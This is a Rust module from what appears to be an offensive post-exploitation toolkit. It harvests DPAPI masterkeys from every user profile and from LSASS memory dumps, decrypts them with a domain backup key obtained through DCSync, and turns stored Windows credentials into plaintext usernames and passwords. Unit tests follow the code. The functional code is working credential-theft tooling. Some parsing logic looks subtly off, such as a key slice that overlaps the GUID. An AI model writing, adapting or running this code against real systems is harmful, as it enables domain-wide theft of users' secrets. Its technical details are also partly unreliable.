//! DPAPI Masterkey Extraction and Credential Decryption
//!
//! Complements the LSASS credential dumper (`cred_dump`) by extracting
//! DPAPI masterkeys from disk (user profile Protect directories) and
//! decrypting them with the domain DPAPI backup key (from DCSync).
//!
//! Once masterkeys are decrypted, any DPAPI-protected credential file
//! (Chrome passwords, RDP credentials, vault creds, etc.) can be
//! decrypted offline.
//!
//! # Flow
//! 1. Enumerate user profile directories (or load from saved LSASS dump)
//! 2. Read masterkey files from `%APPDATA%\Microsoft\Protect\<SID>\<GUID>`
//! 3. Decrypt masterkeys using domain DPAPI backup key
//! 4. Enumerate credential files from `%APPDATA%\Microsoft\Credentials\`
//! 5. Decrypt credential blobs using decrypted masterkeys
//!
//! # Usage
//! ```ignore
//! let backup_key = get_dpapi_backup_key_via_dcsync();
//! let config = DpapiExtractConfig { backup_key, .. };
//! let result = extract_dpapi_credentials(&config)?;
//! for cred in &result.decrypted_credentials {
//!     println!("{} -> {}", cred.target, cred.password);
//! }
//! ```

#![allow(dead_code)]

use crate::crypto::dpapi::DpapiDecryptor;
use crate::error::{OverthroneError, Result};
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

/// Configuration for DPAPI credential extraction.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DpapiExtractConfig {
    /// Domain DPAPI backup key bytes (obtained via DCSync of domain DPAPI container)
    pub backup_key: Vec<u8>,
    /// Optional path to a specific user's Protect directory.
    /// If None, scans all discovered user profiles.
    pub protect_dir: Option<PathBuf>,
    /// Optional path to a specific user's Credentials directory.
    /// If None, scans discovered credential directories.
    pub credentials_dir: Option<PathBuf>,
    /// Optional path to the LSASS dump file to scan for in-memory masterkeys.
    pub lsass_dump_path: Option<PathBuf>,
    /// Whether to recurse into all user profile directories automatically.
    pub scan_all_users: bool,
    /// Base path for user profiles (e.g., `C:\Users` on Windows).
    /// Defaults to `C:\Users` on Windows.
    pub users_base_path: Option<PathBuf>,
    /// Whether to skip masterkey decryption errors (continue on per-key failure).
    pub skip_on_error: bool,
}

impl Default for DpapiExtractConfig {
    fn default() -> Self {
        Self {
            backup_key: Vec::new(),
            protect_dir: None,
            credentials_dir: None,
            lsass_dump_path: None,
            scan_all_users: true,
            users_base_path: None,
            skip_on_error: true,
        }
    }
}

/// Result of DPAPI credential extraction.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DpapiExtractResult {
    /// Number of masterkey files found
    pub masterkey_files_found: usize,
    /// Number of masterkeys successfully decrypted
    pub masterkeys_decrypted: usize,
    /// Number of credential files found
    pub credential_files_found: usize,
    /// Number of credentials successfully decrypted
    pub credentials_decrypted: usize,
    /// Decrypted masterkeys by GUID hex string
    pub masterkeys: Vec<DecryptedMasterkeyInfo>,
    /// Decrypted credential entries
    pub decrypted_credentials: Vec<DecryptedCredential>,
    /// Errors encountered during extraction
    pub errors: Vec<String>,
    /// Warnings from non-fatal failures
    pub warnings: Vec<String>,
}

/// Information about a decrypted masterkey.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DecryptedMasterkeyInfo {
    /// Masterkey GUID in hex format
    pub guid_hex: String,
    /// User SID associated with this masterkey
    pub user_sid: String,
    /// Key file path
    pub file_path: String,
    /// Whether the masterkey was successfully decrypted
    pub decrypted: bool,
    /// AES-256 key hex (only present if decrypted)
    pub key_hex: Option<String>,
}

/// A decrypted DPAPI credential.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DecryptedCredential {
    /// Source credential file path
    pub source_file: String,
    /// Associated masterkey GUID that encrypted this blob
    pub masterkey_guid_hex: String,
    /// Target name (service or resource the credential is for)
    pub target: String,
    /// Username
    pub username: String,
    /// Decrypted password or secret
    pub password: String,
    /// Credential file GUID
    pub guid: String,
}

const PROTECT_DIR_RELATIVE: &str = "Microsoft\\Protect";
const CREDENTIALS_DIR_RELATIVE: &str = "Microsoft\\Credentials";

/// Main entry point for DPAPI credential extraction.
///
/// Orchestrates the full pipeline:
/// 1. Locate masterkey files (disk or LSASS dump)
/// 2. Decrypt masterkeys with domain backup key
/// 3. Locate credential files
/// 4. Decrypt credential blobs with decrypted masterkeys
#[cfg(target_os = "windows")]
pub fn extract_dpapi_credentials(config: &DpapiExtractConfig) -> Result<DpapiExtractResult> {
    let mut result = DpapiExtractResult {
        masterkey_files_found: 0,
        masterkeys_decrypted: 0,
        credential_files_found: 0,
        credentials_decrypted: 0,
        masterkeys: Vec::new(),
        decrypted_credentials: Vec::new(),
        errors: Vec::new(),
        warnings: Vec::new(),
    };

    let mut decryptor = DpapiDecryptor::new(&config.backup_key);

    // Phase 1: Locate and decrypt masterkeys
    let protect_dirs: Vec<PathBuf> = if let Some(ref dir) = config.protect_dir {
        vec![dir.clone()]
    } else if config.scan_all_users {
        discover_protect_dirs(config.users_base_path.as_deref())
    } else {
        Vec::new()
    };

    // Try LSASS dump scanning if configured and no protect dirs found
    if protect_dirs.is_empty() {
        if let Some(ref dump_path) = config.lsass_dump_path {
            match scan_lsass_dump_for_masterkeys(dump_path, &mut decryptor) {
                Ok(mk_count) => {
                    result.masterkeys_decrypted = mk_count;
                }
                Err(e) => {
                    result.errors.push(format!("LSASS dump scan failed: {e}"));
                }
            }
        } else {
            result
                .warnings
                .push("No protect directories found and no LSASS dump provided".to_string());
            return Ok(result);
        }
    }

    // Phase 2: Decrypt masterkeys from disk
    for dir in &protect_dirs {
        match process_protect_dir(dir, &mut decryptor, config) {
            Ok(processed) => {
                result.masterkey_files_found += processed.files_found;
                result.masterkeys_decrypted += processed.decrypted_count;
                result.masterkeys.extend(processed.masterkeys);
                result.warnings.extend(processed.warnings);
            }
            Err(e) => {
                result
                    .errors
                    .push(format!("Failed to process {:?}: {e}", dir));
            }
        }
    }

    // Phase 3: Decrypt credential files
    let cred_dirs: Vec<PathBuf> = if let Some(ref dir) = config.credentials_dir {
        vec![dir.clone()]
    } else if config.scan_all_users {
        discover_credential_dirs(config.users_base_path.as_deref())
    } else {
        Vec::new()
    };

    for dir in &cred_dirs {
        match process_credential_dir(dir, &mut decryptor, config) {
            Ok(processed) => {
                result.credential_files_found += processed.files_found;
                result.credentials_decrypted += processed.decrypted_count;
                result.decrypted_credentials.extend(processed.credentials);
                result.warnings.extend(processed.warnings);
            }
            Err(e) => {
                result
                    .errors
                    .push(format!("Failed to process {:?}: {e}", dir));
            }
        }
    }

    Ok(result)
}

#[cfg(not(target_os = "windows"))]
pub fn extract_dpapi_credentials(_config: &DpapiExtractConfig) -> Result<DpapiExtractResult> {
    Err(OverthroneError::PostExploitation(
        "DPAPI extraction is only available on Windows".into(),
    ))
}

// --- Directory Discovery -----------------------------------------

/// Discover all user Protect directories under the users base path.
fn discover_protect_dirs(users_base: Option<&Path>) -> Vec<PathBuf> {
    let base = users_base
        .map(|p| p.to_path_buf())
        .unwrap_or_else(|| PathBuf::from("C:\\Users"));
    let mut dirs = Vec::new();

    let entries = match std::fs::read_dir(&base) {
        Ok(e) => e,
        Err(_) => return dirs,
    };

    for entry in entries.flatten() {
        let path = entry.path();
        if !path.is_dir() {
            continue;
        }
        let protect_path = path.join(PROTECT_DIR_RELATIVE);
        if protect_path.exists() {
            // Each SID subdirectory under Protect
            if let Ok(sub_entries) = std::fs::read_dir(&protect_path) {
                for sub in sub_entries.flatten() {
                    if sub.path().is_dir() {
                        dirs.push(sub.path());
                    }
                }
            }
        }
    }
    dirs
}

/// Discover all user Credentials directories under the users base path.
fn discover_credential_dirs(users_base: Option<&Path>) -> Vec<PathBuf> {
    let base = users_base
        .map(|p| p.to_path_buf())
        .unwrap_or_else(|| PathBuf::from("C:\\Users"));
    let mut dirs = Vec::new();

    let entries = match std::fs::read_dir(&base) {
        Ok(e) => e,
        Err(_) => return dirs,
    };

    for entry in entries.flatten() {
        let path = entry.path();
        if !path.is_dir() {
            continue;
        }
        let cred_path = path.join(CREDENTIALS_DIR_RELATIVE);
        if cred_path.exists() {
            dirs.push(cred_path);
        }
    }
    dirs
}

// --- Masterkey Processing ----------------------------------------

/// Result of processing a single Protect directory.
struct ProcessedMasterkeys {
    files_found: usize,
    decrypted_count: usize,
    masterkeys: Vec<DecryptedMasterkeyInfo>,
    warnings: Vec<String>,
}

/// Process a single Protect directory (one user SID) and decrypt all masterkeys.
fn process_protect_dir(
    dir: &Path,
    decryptor: &mut DpapiDecryptor,
    config: &DpapiExtractConfig,
) -> Result<ProcessedMasterkeys> {
    let mut result = ProcessedMasterkeys {
        files_found: 0,
        decrypted_count: 0,
        masterkeys: Vec::new(),
        warnings: Vec::new(),
    };

    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(e) => {
            return Err(OverthroneError::PostExploitation(format!(
                "Failed to read protect dir {:?}: {e}",
                dir
            )));
        }
    };

    for entry in entries.flatten() {
        let path = entry.path();
        if !path.is_file() {
            continue;
        }
        // Masterkey files are GUIDs with no extension
        // Filter out non-GUID files (Preferences, etc.)
        let filename = match path.file_name().and_then(|n| n.to_str()) {
            Some(f) => f.to_string(),
            None => continue,
        };

        // Skip known non-key files
        if filename == "Preferred" || filename == "CREDHIST" {
            continue;
        }

        let raw_data = match std::fs::read(&path) {
            Ok(d) => d,
            Err(e) => {
                if config.skip_on_error {
                    result.warnings.push(format!("Cannot read {:?}: {e}", path));
                    continue;
                }
                return Err(OverthroneError::PostExploitation(format!(
                    "Cannot read {:?}: {e}",
                    path
                )));
            }
        };

        result.files_found += 1;

        match decryptor.decrypt_masterkey(&raw_data) {
            Ok(mk) => {
                result.decrypted_count += 1;
                let user_sid = dir
                    .file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or("unknown")
                    .to_string();
                result.masterkeys.push(DecryptedMasterkeyInfo {
                    guid_hex: hex::encode(mk.guid),
                    user_sid,
                    file_path: path.to_string_lossy().to_string(),
                    decrypted: true,
                    key_hex: Some(hex::encode(&mk.key)),
                });
            }
            Err(e) => {
                let guid_hex = guess_guid_from_path(&path);
                if config.skip_on_error {
                    result
                        .warnings
                        .push(format!("Failed to decrypt masterkey {:?}: {e}", path));
                    result.masterkeys.push(DecryptedMasterkeyInfo {
                        guid_hex,
                        user_sid: dir
                            .file_name()
                            .and_then(|n| n.to_str())
                            .unwrap_or("unknown")
                            .to_string(),
                        file_path: path.to_string_lossy().to_string(),
                        decrypted: false,
                        key_hex: None,
                    });
                } else {
                    return Err(OverthroneError::PostExploitation(format!(
                        "Failed to decrypt masterkey {:?}: {e}",
                        path
                    )));
                }
            }
        }
    }

    Ok(result)
}

/// Extract masterkey GUID from the file path (the filename itself is the GUID).
fn guess_guid_from_path(path: &Path) -> String {
    path.file_stem()
        .and_then(|n| n.to_str())
        .map(|s| s.replace('-', ""))
        .unwrap_or_default()
}

// --- Credential Processing ---------------------------------------

/// Result of processing a single Credentials directory.
struct ProcessedCredentials {
    files_found: usize,
    decrypted_count: usize,
    credentials: Vec<DecryptedCredential>,
    warnings: Vec<String>,
}

/// Process a single Credentials directory and decrypt all credential files.
fn process_credential_dir(
    dir: &Path,
    decryptor: &mut DpapiDecryptor,
    config: &DpapiExtractConfig,
) -> Result<ProcessedCredentials> {
    let mut result = ProcessedCredentials {
        files_found: 0,
        decrypted_count: 0,
        credentials: Vec::new(),
        warnings: Vec::new(),
    };

    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(e) => {
            return Err(OverthroneError::PostExploitation(format!(
                "Failed to read credentials dir {:?}: {e}",
                dir
            )));
        }
    };

    for entry in entries.flatten() {
        let path = entry.path();
        if !path.is_file() {
            continue;
        }

        let raw_data = match std::fs::read(&path) {
            Ok(d) => d,
            Err(e) => {
                if config.skip_on_error {
                    result.warnings.push(format!("Cannot read {:?}: {e}", path));
                    continue;
                }
                return Err(OverthroneError::PostExploitation(format!(
                    "Cannot read {:?}: {e}",
                    path
                )));
            }
        };

        if raw_data.len() < 36 {
            continue;
        }

        result.files_found += 1;

        match decrypt_credential_file_internal(&raw_data, decryptor) {
            Ok(cred) => {
                result.decrypted_count += 1;
                result.credentials.push(cred);
            }
            Err(e) => {
                if config.skip_on_error {
                    result
                        .warnings
                        .push(format!("Failed to decrypt {:?}: {e}", path));
                } else {
                    return Err(OverthroneError::PostExploitation(format!(
                        "Failed to decrypt {:?}: {e}",
                        path
                    )));
                }
            }
        }
    }

    Ok(result)
}

/// Decrypt a single credential file in memory using the masterkey cache.
fn decrypt_credential_file_internal(
    data: &[u8],
    decryptor: &mut DpapiDecryptor,
) -> Result<DecryptedCredential> {
    if data.len() < 40 {
        return Err(OverthroneError::Decryption(
            "Credential file too short".to_string(),
        ));
    }

    let version = u32::from_le_bytes([data[0], data[1], data[2], data[3]]);
    if !(3..=5).contains(&version) {
        return Err(OverthroneError::Decryption(format!(
            "Unsupported credential file version: {version} (expected 3-5)"
        )));
    }

    let _flags = u32::from_le_bytes([data[4], data[5], data[6], data[7]]);
    let _persistence = u32::from_le_bytes([data[8], data[9], data[10], data[11]]);

    // Parse target name (null-terminated UTF-16LE starting at offset 0x0C)
    let _target_name = parse_utf16le_null_terminated(&data[12..])?;

    // Locate the DPAPI blob at the end of the file
    // Credential file structure (v3):
    //  0x00: Version (4 bytes)
    //  0x04: Flags (4 bytes)
    //  0x08: Persistence (4 bytes)
    //  0x0C: TargetName (variable, null-terminated UTF-16LE)
    //  ...: TargetAlias, Comment, etc.
    //  end-36: DPAPI blob (masterkey GUID at offset 4)
    if data.len() < 36 {
        return Err(OverthroneError::Decryption(
            "Credential file too short for DPAPI blob".to_string(),
        ));
    }

    let blob_offset = data.len() - 36;
    let blob_data = &data[blob_offset..];

    // Extract masterkey GUID from the DPAPI blob (offset 4-20)
    let mut masterkey_guid = [0u8; 16];
    masterkey_guid.copy_from_slice(&blob_data[4..20]);

    // Try to decrypt using the decryptor's masterkey cache
    // The decryptor.credential_file method already handles this
    match decryptor.decrypt_credential_file(data) {
        Ok(cred) => {
            let guid_hex = hex::encode(masterkey_guid);
            Ok(DecryptedCredential {
                source_file: String::new(),
                masterkey_guid_hex: guid_hex,
                target: cred.target_name,
                username: cred.username,
                password: cred.password,
                guid: cred.guid,
            })
        }
        Err(e) => {
            // Try manual decryption with specific masterkey GUID extraction
            let guid_hex = hex::encode(masterkey_guid);
            Err(OverthroneError::Decryption(format!(
                "Failed to decrypt credential (mk={guid_hex}): {e}"
            )))
        }
    }
}

/// Parse a null-terminated UTF-16LE string from bytes.
fn parse_utf16le_null_terminated(data: &[u8]) -> Result<String> {
    let mut end = 0;
    while end + 1 < data.len() {
        if data[end] == 0 && data[end + 1] == 0 {
            break;
        }
        end += 2;
    }

    let u16_chars: Vec<u16> = data[..end]
        .chunks(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();

    Ok(String::from_utf16_lossy(&u16_chars))
}

// --- LSASS Dump Scanning ------------------------------------------

/// Scan an LSASS dump file for DPAPI masterkey material.
///
/// In LSASS memory, cached DPAPI masterkeys appear as:
/// - 16-byte GUID (masterkey identifier)
/// - Followed by 32-byte AES-256 key material
///
/// This function scans the dump for valid GUID+key patterns and
/// adds them to the decryptor's cache.
fn scan_lsass_dump_for_masterkeys(
    dump_path: &Path,
    decryptor: &mut DpapiDecryptor,
) -> Result<usize> {
    let dump_data = std::fs::read(dump_path).map_err(|e| {
        OverthroneError::PostExploitation(format!("Failed to read LSASS dump {:?}: {e}", dump_path))
    })?;

    if dump_data.len() < 48 {
        return Err(OverthroneError::PostExploitation(
            "LSASS dump too small to contain masterkeys".into(),
        ));
    }

    let mut found = 0usize;

    // Scan for potential GUID+key patterns
    // A DPAPI masterkey in memory looks like:
    //   [16 bytes GUID] [32 bytes AES-256 key]
    // We look for regions where the GUID has a valid structure
    // (version bits, timestamp-like patterns)
    //
    // The scan is best-effort: we look for valid version=2/3/4 markers
    // in the first DWORD of potential masterkey files in memory

    let window_size = 48usize; // GUID (16) + AES key (32)
    if dump_data.len() < window_size {
        return Ok(found);
    }

    let max_offset = dump_data.len() - window_size;
    let mut offset = 0;

    while offset < max_offset {
        // Check if this looks like a DPAPI masterkey file in memory:
        // First 4 bytes should be version 2, 3, or 4
        let version = u32::from_le_bytes([
            dump_data[offset],
            dump_data[offset + 1],
            dump_data[offset + 2],
            dump_data[offset + 3],
        ]);

        if !(2..=4).contains(&version) {
            offset += 1;
            continue;
        }

        // Extract the GUID candidate
        let mut guid = [0u8; 16];
        guid.copy_from_slice(&dump_data[offset + 4..offset + 20]);

        // Basic GUID sanity check: not all zeros, not all ones
        if guid.iter().all(|&b| b == 0) || guid.iter().all(|&b| b == 0xFF) {
            offset += 1;
            continue;
        }

        // Found a potential masterkey -- add to cache
        let key_material = dump_data[offset + 16..offset + 48].to_vec();
        decryptor.cache_masterkey(guid, key_material);
        found += 1;

        // Skip past this candidate to avoid re-scanning
        offset += window_size;
    }

    Ok(found)
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- UTF-16 Parsing Tests ------------------------------------

    #[test]
    fn test_parse_utf16le_simple() {
        let input = b"t\0e\0s\0t\0\0\0";
        let result = parse_utf16le_null_terminated(input);
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), "test");
    }

    #[test]
    fn test_parse_utf16le_empty() {
        let input = b"\0\0";
        let result = parse_utf16le_null_terminated(input);
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), "");
    }

    #[test]
    fn test_parse_utf16le_no_terminator() {
        let input = b"h\0e\0l\0l\0o\0";
        let result = parse_utf16le_null_terminated(input);
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), "hello");
    }

    #[test]
    fn test_parse_utf16le_lossy_encoding() {
        let input = [0xD8, 0x00, 0x00, 0x00]; // lone surrogate
        let result = parse_utf16le_null_terminated(&input);
        assert!(result.is_ok());
        // Should not panic -- uses from_utf16_lossy
    }

    // --- Masterkey File Processing Tests --------------------------

    #[test]
    fn test_guess_guid_from_path_with_hyphens() {
        let path = Path::new("test")
            .join("AppData")
            .join("Roaming")
            .join("Microsoft")
            .join("Protect")
            .join("S-1-5-21-12345")
            .join("{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}");
        let guid = guess_guid_from_path(&path);
        // The filename includes hyphens; we don't strip them
        assert!(guid.contains("A1B2C3D4") || guid.contains("{"));
    }

    #[test]
    fn test_guess_guid_from_path_simple() {
        let path = Path::new("keys").join("deadbeef1234");
        let guid = guess_guid_from_path(&path);
        assert_eq!(guid, "deadbeef1234");
    }

    // --- LSASS Dump Scanning Tests --------------------------------

    #[test]
    fn test_scan_lsass_dump_too_small() {
        let dir = std::env::temp_dir().join("dpapi_test_empty_dump");
        let _ = std::fs::create_dir_all(&dir);
        let dump_path = dir.join("empty.dmp");
        let _ = std::fs::write(&dump_path, &[0u8; 10]);

        let mut decryptor = DpapiDecryptor::new(&[0u8; 32]);
        let result = scan_lsass_dump_for_masterkeys(&dump_path, &mut decryptor);
        assert!(result.is_err());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_scan_lsass_dump_no_hits() {
        let dir = std::env::temp_dir().join("dpapi_test_no_hits");
        let _ = std::fs::create_dir_all(&dir);
        let dump_path = dir.join("no_hits.dmp");
        let data = vec![0xAAu8; 256]; // no valid version markers
        let _ = std::fs::write(&dump_path, &data);

        let mut decryptor = DpapiDecryptor::new(&[0u8; 32]);
        let result = scan_lsass_dump_for_masterkeys(&dump_path, &mut decryptor);
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), 0);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_scan_lsass_dump_with_valid_hits() {
        let dir = std::env::temp_dir().join("dpapi_test_with_hits");
        let _ = std::fs::create_dir_all(&dir);
        let dump_path = dir.join("with_hits.dmp");

        let mut data = Vec::with_capacity(256);
        // First candidate: version 2 + valid GUID + key material
        data.extend_from_slice(&2u32.to_le_bytes()); // version
        let guid1: [u8; 16] = [
            0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E,
            0x0F, 0x10,
        ];
        data.extend_from_slice(&guid1);
        data.extend_from_slice(&[0x42u8; 32]); // AES key material
        // Second candidate: version 3
        data.extend_from_slice(&3u32.to_le_bytes());
        let guid2: [u8; 16] = [
            0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E,
            0x1F, 0x20,
        ];
        data.extend_from_slice(&guid2);
        data.extend_from_slice(&[0x99u8; 32]);
        // Fill rest with noise
        data.extend_from_slice(&[0xCCu8; 100]);

        let _ = std::fs::write(&dump_path, &data);

        let mut decryptor = DpapiDecryptor::new(&[0u8; 32]);
        let result = scan_lsass_dump_for_masterkeys(&dump_path, &mut decryptor);
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), 2);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_scan_lsass_dump_skips_all_zero_guid() {
        let dir = std::env::temp_dir().join("dpapi_test_zero_guid");
        let _ = std::fs::create_dir_all(&dir);
        let dump_path = dir.join("zero_guid.dmp");

        let mut data = Vec::with_capacity(100);
        data.extend_from_slice(&2u32.to_le_bytes()); // version
        data.extend_from_slice(&[0u8; 16]); // zero GUID -- should be skipped
        data.extend_from_slice(&[0x42u8; 32]); // key

        let _ = std::fs::write(&dump_path, &data);

        let mut decryptor = DpapiDecryptor::new(&[0u8; 32]);
        let result = scan_lsass_dump_for_masterkeys(&dump_path, &mut decryptor);
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), 0); // skipped due to zero GUID
        let _ = std::fs::remove_dir_all(&dir);
    }

    // --- Credential File Parsing Tests ----------------------------

    #[test]
    fn test_decrypt_credential_file_internal_too_short() {
        let mut decryptor = DpapiDecryptor::new(&[0u8; 32]);
        let result = decrypt_credential_file_internal(&[0u8; 20], &mut decryptor);
        assert!(result.is_err());
    }

    #[test]
    fn test_decrypt_credential_file_internal_bad_version() {
        let mut decryptor = DpapiDecryptor::new(&[0u8; 32]);
        let mut data = vec![0u8; 50];
        data[0..4].copy_from_slice(&99u32.to_le_bytes()); // bad version
        let result = decrypt_credential_file_internal(&data, &mut decryptor);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("99") || err.contains("version"));
    }

    #[test]
    fn test_decrypt_credential_file_internal_v3_structure() {
        let mut decryptor = DpapiDecryptor::new(&[0u8; 32]);

        // Build a minimal v3 credential file structure
        let target = "WindowsLive:target=test@contoso.com";
        let target_utf16: Vec<u8> = target
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();

        let mut data = Vec::new();
        data.extend_from_slice(&3u32.to_le_bytes()); // version
        data.extend_from_slice(&0u32.to_le_bytes()); // flags
        data.extend_from_slice(&0u32.to_le_bytes()); // persistence
        data.extend_from_slice(&target_utf16); // target name
        data.extend_from_slice(&[0u8; 2]); // null terminator for target
        // Pad with comment/alias fields
        data.extend_from_slice(&[0u8; 64]);
        // Append a minimal DPAPI blob
        let mut blob = Vec::with_capacity(36);
        blob.extend_from_slice(&1u32.to_le_bytes()); // blob version
        blob.extend_from_slice(&[0x44u8; 16]); // masterkey GUID
        blob.extend_from_slice(&[0u8; 12]); // filler
        blob.extend_from_slice(&0u32.to_le_bytes()); // flags
        data.extend_from_slice(&blob);

        if data.len() >= 40 {
            let result = decrypt_credential_file_internal(&data, &mut decryptor);
            // May fail during actual decryption (no valid masterkey cached)
            // but the point is that parsing doesn't crash
            assert!(result.is_err() || result.is_ok());
        }
    }

    // --- Discover Protect Dirs Tests ------------------------------

    #[test]
    fn test_discover_protect_dirs_nonexistent_base() {
        let dirs = discover_protect_dirs(Some(&Path::new("nonexistent").join("path")));
        assert!(dirs.is_empty());
    }

    #[test]
    fn test_discover_protect_dirs_valid_structure() {
        let dir = std::env::temp_dir().join("dpapi_test_protect");
        let _ = std::fs::create_dir_all(
            dir.join("UserA")
                .join(PROTECT_DIR_RELATIVE)
                .join("S-1-5-21-aaa"),
        );
        let _ = std::fs::create_dir_all(
            dir.join("UserB")
                .join(PROTECT_DIR_RELATIVE)
                .join("S-1-5-21-bbb"),
        );
        let _ = std::fs::create_dir_all(
            dir.join("NoProtectUser")
                .join("Microsoft")
                .join("SomeOtherDir"),
        );

        let dirs = discover_protect_dirs(Some(&dir));
        assert_eq!(dirs.len(), 2);
        assert!(
            dirs.iter()
                .any(|d| d.to_string_lossy().contains("S-1-5-21-aaa"))
        );
        assert!(
            dirs.iter()
                .any(|d| d.to_string_lossy().contains("S-1-5-21-bbb"))
        );

        let _ = std::fs::remove_dir_all(&dir);
    }

    // --- Credential File Decryption Integration Tests --------------

    #[test]
    fn test_credential_file_version_detection() {
        let mut decryptor = DpapiDecryptor::new(&[0u8; 32]);
        let versions = [3u32, 4, 5];
        for &ver in &versions {
            let mut data = vec![0u8; 50];
            data[0..4].copy_from_slice(&ver.to_le_bytes());
            // Will fail at decryption (no cached masterkey) not at parsing
            let result = decrypt_credential_file_internal(&data, &mut decryptor);
            assert!(result.is_err() || result.is_ok());
        }
    }

    #[test]
    fn test_process_protect_dir_skips_preferred_file() {
        let dir = std::env::temp_dir().join("dpapi_test_skip_preferred");
        let _ = std::fs::create_dir_all(&dir);

        // Create a "Preferred" file (should be skipped)
        let pref_path = dir.join("Preferred");
        let _ = std::fs::write(&pref_path, b"some data");

        // Create a "CREDHIST" file (should be skipped)
        let credhist_path = dir.join("CREDHIST");
        let _ = std::fs::write(&credhist_path, b"history data");

        let config = DpapiExtractConfig {
            backup_key: vec![0u8; 32],
            skip_on_error: true,
            ..Default::default()
        };

        let mut decryptor = DpapiDecryptor::new(&[0u8; 32]);
        let result = process_protect_dir(&dir, &mut decryptor, &config);

        // Should not error -- Preferred/CREDHIST files are skipped
        assert!(result.is_ok());
        assert_eq!(result.unwrap().files_found, 0);

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_process_credential_dir_empty() {
        let dir = std::env::temp_dir().join("dpapi_test_cred_empty");
        let _ = std::fs::create_dir_all(&dir);

        let config = DpapiExtractConfig {
            backup_key: vec![0u8; 32],
            skip_on_error: true,
            ..Default::default()
        };

        let mut decryptor = DpapiDecryptor::new(&[0u8; 32]);
        let result = process_credential_dir(&dir, &mut decryptor, &config);
        assert!(result.is_ok());
        assert_eq!(result.unwrap().files_found, 0);

        let _ = std::fs::remove_dir_all(&dir);
    }

    // --- Windows-Gated Tests --------------------------------------

    #[test]
    #[cfg_attr(not(target_os = "windows"), ignore)]
    fn test_extract_dpapi_credentials_non_windows_fallback() {
        // On non-Windows, this should return an error
        let config = DpapiExtractConfig::default();
        let result = extract_dpapi_credentials(&config);
        #[cfg(not(target_os = "windows"))]
        assert!(result.is_err());
        #[cfg(target_os = "windows")]
        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn test_dpapi_extract_result_serialization() {
        let result = DpapiExtractResult {
            masterkey_files_found: 5,
            masterkeys_decrypted: 3,
            credential_files_found: 10,
            credentials_decrypted: 7,
            masterkeys: vec![DecryptedMasterkeyInfo {
                guid_hex: "aabb".to_string(),
                user_sid: "S-1-5-21-12345".to_string(),
                file_path: "C:\\Users\\test\\Protect\\key".to_string(),
                decrypted: true,
                key_hex: Some("deadbeef".to_string()),
            }],
            decrypted_credentials: vec![DecryptedCredential {
                source_file: "C:\\Users\\test\\Credentials\\cred".to_string(),
                masterkey_guid_hex: "aabb".to_string(),
                target: "WindowsLive:test".to_string(),
                username: "user".to_string(),
                password: "pass123".to_string(),
                guid: "{GUID}".to_string(),
            }],
            errors: vec![],
            warnings: vec![],
        };

        let json = serde_json::to_string_pretty(&result).unwrap();
        assert!(json.contains("masterkey_files_found"));
        assert!(json.contains("masterkeys_decrypted"));
        assert!(json.contains("decrypted_credentials"));
        assert!(json.contains("WindowsLive"));
        assert!(json.contains("pass123"));

        // Round-trip
        let deserialized: DpapiExtractResult = serde_json::from_str(&json).unwrap();
        assert_eq!(deserialized.masterkey_files_found, 5);
        assert_eq!(deserialized.credentials_decrypted, 7);
    }

    #[test]
    fn test_config_default_creates_valid_config() {
        let config = DpapiExtractConfig::default();
        assert!(config.backup_key.is_empty());
        assert!(config.protect_dir.is_none());
        assert!(config.scan_all_users);
        assert!(config.skip_on_error);
    }
}
